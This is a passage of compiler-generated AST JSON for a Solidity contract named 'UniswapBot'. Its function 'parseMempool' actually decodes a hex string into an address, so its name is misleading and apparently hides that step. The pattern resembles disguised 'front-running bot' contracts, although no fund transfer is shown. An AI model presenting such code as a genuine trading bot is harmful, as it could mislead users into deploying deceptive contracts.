																				"typeString": "bool"
																			}
																		},
																		"src": "9164:24:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		}
																	},
																	"falseBody": null,
																	"id": 870,
																	"nodeType": "IfStatement",
																	"src": "9160:73:0",
																	"trueBody": {
																		"id": 869,
																		"nodeType": "Block",
																		"src": "9190:43:0",
																		"statements": [
																			{
																				"expression": {
																					"argumentTypes": null,
																					"id": 867,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"lValueRequested": false,
																					"leftHandSide": {
																						"argumentTypes": null,
																						"id": 865,
																						"name": "b2",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 736,
																						"src": "9209:2:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint160",
																							"typeString": "uint160"
																						}
																					},
																					"nodeType": "Assignment",
																					"operator": "-=",
																					"rightHandSide": {
																						"argumentTypes": null,
																						"hexValue": "3438",
																						"id": 866,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": true,
																						"kind": "number",
																						"lValueRequested": false,
																						"nodeType": "Literal",
																						"src": "9215:2:0",
																						"subdenomination": null,
																						"typeDescriptions": {
																							"typeIdentifier": "t_rational_48_by_1",
																							"typeString": "int_const 48"
																						},
																						"value": "48"
																					},
																					"src": "9209:8:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint160",
																						"typeString": "uint160"
																					}
																				},
																				"id": 868,
																				"nodeType": "ExpressionStatement",
																				"src": "9209:8:0"
																			}
																		]
																	}
																},
																"id": 871,
																"nodeType": "IfStatement",
																"src": "9081:152:0",
																"trueBody": {
																	"id": 855,
																	"nodeType": "Block",
																	"src": "9111:43:0",
																	"statements": [
																		{
																			"expression": {
																				"argumentTypes": null,
																				"id": 853,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftHandSide": {
																					"argumentTypes": null,
																					"id": 851,
																					"name": "b2",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 736,
																					"src": "9130:2:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint160",
																						"typeString": "uint160"
																					}
																				},
																				"nodeType": "Assignment",
																				"operator": "-=",
																				"rightHandSide": {
																					"argumentTypes": null,
																					"hexValue": "3535",
																					"id": 852,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "number",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "9136:2:0",
																					"subdenomination": null,
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_55_by_1",
																						"typeString": "int_const 55"
																					},
																					"value": "55"
																				},
																				"src": "9130:8:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint160",
																					"typeString": "uint160"
																				}
																			},
																			"id": 854,
																			"nodeType": "ExpressionStatement",
																			"src": "9130:8:0"
																		}
																	]
																}
															},
															"id": 872,
															"nodeType": "IfStatement",
															"src": "9001:232:0",
															"trueBody": {
																"id": 841,
																"nodeType": "Block",
																"src": "9032:43:0",
																"statements": [
																	{
																		"expression": {
																			"argumentTypes": null,
																			"id": 839,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftHandSide": {
																				"argumentTypes": null,
																				"id": 837,
																				"name": "b2",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 736,
																				"src": "9051:2:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint160",
																					"typeString": "uint160"
																				}
																			},
																			"nodeType": "Assignment",
																			"operator": "-=",
																			"rightHandSide": {
																				"argumentTypes": null,
																				"hexValue": "3837",
																				"id": 838,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "number",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "9057:2:0",
																				"subdenomination": null,
																				"typeDescriptions": {
																					"typeIdentifier": "t_rational_87_by_1",
																					"typeString": "int_const 87"
																				},
																				"value": "87"
																			},
																			"src": "9051:8:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint160",
																				"typeString": "uint160"
																			}
																		},
																		"id": 840,
																		"nodeType": "ExpressionStatement",
																		"src": "9051:8:0"
																	}
																]
															}
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 880,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 873,
																	"name": "iaddr",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 729,
																	"src": "9247:5:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint160",
																		"typeString": "uint160"
																	}
																},
																"nodeType": "Assignment",
																"operator": "+=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"components": [
																		{
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint160",
																				"typeString": "uint160"
																			},
																			"id": 878,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"commonType": {
																					"typeIdentifier": "t_uint160",
																					"typeString": "uint160"
																				},
																				"id": 876,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftExpression": {
																					"argumentTypes": null,
																					"id": 874,
																					"name": "b1",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 733,
																					"src": "9257:2:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint160",
																						"typeString": "uint160"
																					}
																				},
																				"nodeType": "BinaryOperation",
																				"operator": "*",
																				"rightExpression": {
																					"argumentTypes": null,
																					"hexValue": "3136",
																					"id": 875,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "number",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "9262:2:0",
																					"subdenomination": null,
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_16_by_1",
																						"typeString": "int_const 16"
																					},
																					"value": "16"
																				},
																				"src": "9257:7:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint160",
																					"typeString": "uint160"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "+",
																			"rightExpression": {
																				"argumentTypes": null,
																				"id": 877,
																				"name": "b2",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 736,
																				"src": "9267:2:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint160",
																					"typeString": "uint160"
																				}
																			},
																			"src": "9257:12:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint160",
																				"typeString": "uint160"
																			}
																		}
																	],
																	"id": 879,
																	"isConstant": false,
																	"isInlineArray": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"nodeType": "TupleExpression",
																	"src": "9256:14:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint160",
																		"typeString": "uint160"
																	}
																},
																"src": "9247:23:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint160",
																	"typeString": "uint160"
																}
															},
															"id": 881,
															"nodeType": "ExpressionStatement",
															"src": "9247:23:0"
														}
													]
												},
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 748,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 742,
														"name": "i",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 739,
														"src": "8601:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "<",
													"rightExpression": {
														"argumentTypes": null,
														"commonType": {
															"typeIdentifier": "t_rational_42_by_1",
															"typeString": "int_const 42"
														},
														"id": 747,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"leftExpression": {
															"argumentTypes": null,
															"hexValue": "32",
															"id": 743,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "8605:1:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_rational_2_by_1",
																"typeString": "int_const 2"
															},
															"value": "2"
														},
														"nodeType": "BinaryOperation",
														"operator": "+",
														"rightExpression": {
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_rational_40_by_1",
																"typeString": "int_const 40"
															},
															"id": 746,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"hexValue": "32",
																"id": 744,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "8609:1:0",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_2_by_1",
																	"typeString": "int_const 2"
																},
																"value": "2"
															},
															"nodeType": "BinaryOperation",
															"operator": "*",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "3230",
																"id": 745,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "8613:2:0",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_20_by_1",
																	"typeString": "int_const 20"
																},
																"value": "20"
															},
															"src": "8609:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_rational_40_by_1",
																"typeString": "int_const 40"
															}
														},
														"src": "8605:10:0",
														"typeDescriptions": {
															"typeIdentifier": "t_rational_42_by_1",
															"typeString": "int_const 42"
														}
													},
													"src": "8601:14:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 883,
												"initializationExpression": {
													"assignments": [
														739
													],
													"declarations": [
														{
															"constant": false,
															"id": 739,
															"mutability": "mutable",
															"name": "i",
															"nodeType": "VariableDeclaration",
															"overrides": null,
															"scope": 883,
															"src": "8589:6:0",
															"stateVariable": false,
															"storageLocation": "default",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"typeName": {
																"id": 738,
																"name": "uint",
																"nodeType": "ElementaryTypeName",
																"src": "8589:4:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"value": null,
															"visibility": "internal"
														}
													],
													"id": 741,
													"initialValue": {
														"argumentTypes": null,
														"hexValue": "32",
														"id": 740,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "8598:1:0",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_2_by_1",
															"typeString": "int_const 2"
														},
														"value": "2"
													},
													"nodeType": "VariableDeclarationStatement",
													"src": "8589:10:0"
												},
												"loopExpression": {
													"expression": {
														"argumentTypes": null,
														"id": 751,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftHandSide": {
															"argumentTypes": null,
															"id": 749,
															"name": "i",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 739,
															"src": "8617:1:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "Assignment",
														"operator": "+=",
														"rightHandSide": {
															"argumentTypes": null,
															"hexValue": "32",
															"id": 750,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "8622:1:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_rational_2_by_1",
																"typeString": "int_const 2"
															},
															"value": "2"
														},
														"src": "8617:6:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"id": 752,
													"nodeType": "ExpressionStatement",
													"src": "8617:6:0"
												},
												"nodeType": "ForStatement",
												"src": "8584:698:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 886,
															"name": "iaddr",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 729,
															"src": "9307:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint160",
																"typeString": "uint160"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint160",
																"typeString": "uint160"
															}
														],
														"id": 885,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "ElementaryTypeNameExpression",
														"src": "9299:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_type$_t_address_$",
															"typeString": "type(address)"
														},
														"typeName": {
															"id": 884,
															"name": "address",
															"nodeType": "ElementaryTypeName",
															"src": "9299:7:0",
															"typeDescriptions": {
																"typeIdentifier": null,
																"typeString": null
															}
														}
													},
													"id": 887,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "typeConversion",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "9299:14:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_address_payable",
														"typeString": "address payable"
													}
												},
												"functionReturnParameters": 720,
												"id": 888,
												"nodeType": "Return",
												"src": "9292:21:0"
											}
										]
									},
									"documentation": null,
									"id": 890,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "parseMempool",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 717,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 716,
												"mutability": "mutable",
												"name": "_a",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 890,
												"src": "8404:16:0",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 715,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "8404:6:0",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "8403:18:0"
									},
									"returnParameters": {
										"id": 720,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 719,
												"mutability": "mutable",
												"name": "_parsed",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 890,
												"src": "8445:15:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 718,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "8445:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "8444:17:0"
									},
									"scope": 1578,
									"src": "8382:939:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 898,
										"nodeType": "Block",
										"src": "9559:104:0",
										"statements": [
											{
												"AST": {
													"nodeType": "YulBlock",
													"src": "9579:77:0",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "9594:51:0",
															"value": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"arguments": [
																					{
																						"name": "self",
																						"nodeType": "YulIdentifier",
																						"src": "9621:4:0"
																					},
																					{
																						"kind": "number",
																						"nodeType": "YulLiteral",
																						"src": "9627:2:0",
																						"type": "",
																						"value": "32"
																					}
																				],
																				"functionName": {
																					"name": "add",
																					"nodeType": "YulIdentifier",
																					"src": "9617:3:0"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "9617:13:0"
																			}
																		],
																		"functionName": {
																			"name": "mload",
																			"nodeType": "YulIdentifier",
																			"src": "9611:5:0"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "9611:20:0"
																	},
																	{
																		"arguments": [
																			{
																				"name": "self",
																				"nodeType": "YulIdentifier",
																				"src": "9639:4:0"
																			}
																		],
																		"functionName": {
																			"name": "mload",
																			"nodeType": "YulIdentifier",
																			"src": "9633:5:0"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "9633:11:0"
																	}
																],
																"functionName": {
																	"name": "keccak256",
																	"nodeType": "YulIdentifier",
																	"src": "9601:9:0"
																},
																"nodeType": "YulFunctionCall",
																"src": "9601:44:0"
															},
															"variableNames": [
																{
																	"name": "ret",
																	"nodeType": "YulIdentifier",
																	"src": "9594:3:0"
																}
															]
														}
													]
												},
												"evmVersion": "istanbul",
												"externalReferences": [
													{
														"declaration": 895,
														"isOffset": false,
														"isSlot": false,
														"src": "9594:3:0",
														"valueSize": 1
													},
													{
														"declaration": 892,
														"isOffset": false,
														"isSlot": false,
														"src": "9621:4:0",
														"valueSize": 1
													},
													{
														"declaration": 892,
														"isOffset": false,
														"isSlot": false,
														"src": "9639:4:0",
														"valueSize": 1
													}
												],
												"id": 897,
												"nodeType": "InlineAssembly",
												"src": "9570:86:0"
											}
										]
									},
									"documentation": null,
									"id": 899,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "keccak",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 893,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 892,
												"mutability": "mutable",
												"name": "self",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 899,
												"src": "9504:17:0",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_struct$_slice_$24_memory_ptr",
													"typeString": "struct UniswapBot.slice"
												},
												"typeName": {
													"contractScope": null,
													"id": 891,
													"name": "slice",
													"nodeType": "UserDefinedTypeName",
													"referencedDeclaration": 24,
													"src": "9504:5:0",
													"typeDescriptions": {
														"typeIdentifier": "t_struct$_slice_$24_storage_ptr",
														"typeString": "struct UniswapBot.slice"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "9503:19:0"
									},
									"returnParameters": {
										"id": 896,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 895,
												"mutability": "mutable",
												"name": "ret",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 899,
												"src": "9546:11:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bytes32",
													"typeString": "bytes32"
												},
												"typeName": {
													"id": 894,
													"name": "bytes32",
													"nodeType": "ElementaryTypeName",
													"src": "9546:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bytes32",
														"typeString": "bytes32"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "9545:13:0"
									},
									"scope": 1578,
									"src": "9488:175:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 975,
										"nodeType": "Block",
										"src": "9950:368:0",
										"statements": [
											{
												"assignments": [
													907
												],
												"declarations": [
													{
														"constant": false,
														"id": 907,
														"mutability": "mutable",
														"name": "count",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 975,
														"src": "9963:10:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 906,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "9963:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 909,
												"initialValue": {
													"argumentTypes": null,
													"hexValue": "30",
													"id": 908,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "number",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "9976:1:0",
													"subdenomination": null,
													"typeDescriptions": {
														"typeIdentifier": "t_rational_0_by_1",
														"typeString": "int_const 0"
													},
													"value": "0"
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "9963:14:0"
											},
											{
												"assignments": [
													911
												],
												"declarations": [
													{
														"constant": false,
														"id": 911,
														"mutability": "mutable",
														"name": "b",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 975,
														"src": "9988:6:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 910,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "9988:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 913,
												"initialValue": {
													"argumentTypes": null,
													"id": 912,
													"name": "a",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 901,
													"src": "9997:1:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "9988:10:0"
											},
											{
												"body": {
													"id": 924,
													"nodeType": "Block",
													"src": "10024:56:0",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"id": 918,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"nodeType": "UnaryOperation",
																"operator": "++",
																"prefix": false,
																"src": "10039:7:0",
																"subExpression": {
																	"argumentTypes": null,
																	"id": 917,
																	"name": "count",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 907,
																	"src": "10039:5:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 919,
															"nodeType": "ExpressionStatement",
															"src": "10039:7:0"
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 922,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 920,
																	"name": "b",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 911,
																	"src": "10061:1:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "/=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"hexValue": "3136",
																	"id": 921,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "10066:2:0",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_16_by_1",
																		"typeString": "int_const 16"
																	},
																	"value": "16"
																},
																"src": "10061:7:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 923,
															"nodeType": "ExpressionStatement",
															"src": "10061:7:0"
														}
													]
												},
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 916,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 914,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 911,
														"src": "10016:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "!=",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "30",
														"id": 915,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "10021:1:0",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"src": "10016:6:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 925,
												"nodeType": "WhileStatement",
												"src": "10009:71:0"
											},
											{
												"assignments": [
													927
												],
												"declarations": [
													{
														"constant": false,
														"id": 927,
														"mutability": "mutable",
														"name": "res",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 975,
														"src": "10090:16:0",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_bytes_memory_ptr",
															"typeString": "bytes"
														},
														"typeName": {
															"id": 926,
															"name": "bytes",
															"nodeType": "ElementaryTypeName",
															"src": "10090:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_storage_ptr",
																"typeString": "bytes"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 932,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 930,
															"name": "count",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 907,
															"src": "10119:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 929,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "NewExpression",
														"src": "10109:9:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_objectcreation_pure$_t_uint256_$returns$_t_bytes_memory_ptr_$",
															"typeString": "function (uint256) pure returns (bytes memory)"
														},
														"typeName": {
															"id": 928,
															"name": "bytes",
															"nodeType": "ElementaryTypeName",
															"src": "10113:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_storage_ptr",
																"typeString": "bytes"
															}
														}
													},
													"id": 931,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "10109:16:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_bytes_memory_ptr",
														"typeString": "bytes memory"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "10090:35:0"
											},
											{
												"body": {
													"id": 968,
													"nodeType": "Block",
													"src": "10165:115:0",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"id": 947,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 943,
																	"name": "b",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 911,
																	"src": "10180:1:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"commonType": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	},
																	"id": 946,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftExpression": {
																		"argumentTypes": null,
																		"id": 944,
																		"name": "a",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 901,
																		"src": "10184:1:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"nodeType": "BinaryOperation",
																	"operator": "%",
																	"rightExpression": {
																		"argumentTypes": null,
																		"hexValue": "3136",
																		"id": 945,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "number",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "10188:2:0",
																		"subdenomination": null,
																		"typeDescriptions": {
																			"typeIdentifier": "t_rational_16_by_1",
																			"typeString": "int_const 16"
																		},
																		"value": "16"
																	},
																	"src": "10184:6:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"src": "10180:10:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 948,
															"nodeType": "ExpressionStatement",
															"src": "10180:10:0"
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 962,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"baseExpression": {
																		"argumentTypes": null,
																		"id": 949,
																		"name": "res",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 927,
																		"src": "10205:3:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bytes_memory_ptr",
																			"typeString": "bytes memory"
																		}
																	},
																	"id": 955,
																	"indexExpression": {
																		"argumentTypes": null,
																		"commonType": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		},
																		"id": 954,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"leftExpression": {
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			},
																			"id": 952,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"id": 950,
																				"name": "count",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 907,
																				"src": "10209:5:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "-",
																			"rightExpression": {
																				"argumentTypes": null,
																				"id": 951,
